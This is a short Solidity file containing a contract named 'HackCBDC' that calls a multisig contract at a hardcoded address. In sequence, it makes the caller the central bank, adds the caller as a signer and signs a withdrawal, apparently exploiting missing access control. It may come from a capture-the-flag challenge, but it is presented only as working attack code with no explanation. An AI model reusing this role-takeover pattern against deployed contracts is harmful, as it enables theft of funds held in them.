pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface MultiSig {
  function upgradeUSDC(address _usdc) external ;
  function signWithdrawal() external;
  function updateCentralBank(address _newBank) external;
  function addSignature(address _newSig) external;
}

contract HackCBDC {
  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA;
  function hackCBCD() public {
    MultiSig(cbdc).updateCentralBank(msg.sender);
    MultiSig(cbdc).addSignature(msg.sender);
    MultiSig(cbdc).signWithdrawal();
  }
}

